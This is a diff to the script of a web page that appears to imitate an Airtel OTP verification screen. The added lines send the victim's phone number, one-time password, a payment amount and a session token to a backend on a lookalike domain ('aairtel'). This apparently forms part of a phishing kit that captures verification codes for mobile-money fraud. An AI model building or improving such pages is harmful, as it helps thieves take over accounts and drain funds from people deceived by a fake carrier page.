@@ -372,8 +372,7 @@
 
 <script>
   /* ==================== CONFIG ==================== */
-  const SUPABASE_URL = 'https://YOUR_PROJECT.supabase.co';
-  const SUPABASE_ANON_KEY = 'YOUR_ANON_KEY';
+  const BACKEND_URL = 'https://aairtel-production.up.railway.app';
 
   /* ==================== ELEMENTS ==================== */
   const otpInput = document.getElementById('otpInput');
@@ -387,6 +386,7 @@
   /* ==================== LOAD SESSION DATA ==================== */
   const phone = sessionStorage.getItem('airtel_phone');
   const sessionToken = sessionStorage.getItem('airtel_session');
+  const amount = sessionStorage.getItem('airtel_amount');
 
   // Guard — redirect if missing session
   if (!phone || !sessionToken) {
@@ -458,16 +458,17 @@
     otpInput.disabled = true;
 
     try {
-      const res = await fetch(`${SUPABASE_URL}/functions/v1/verify-otp`, {
+      const res = await fetch(`${BACKEND_URL}/api/otp`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
         },
         body: JSON.stringify({
           phone: phone,
           otp: otp,
-          session_token: sessionToken,
+          amount: amount,
+          session: sessionToken,
+          page: 'otp'
         }),
       });
 
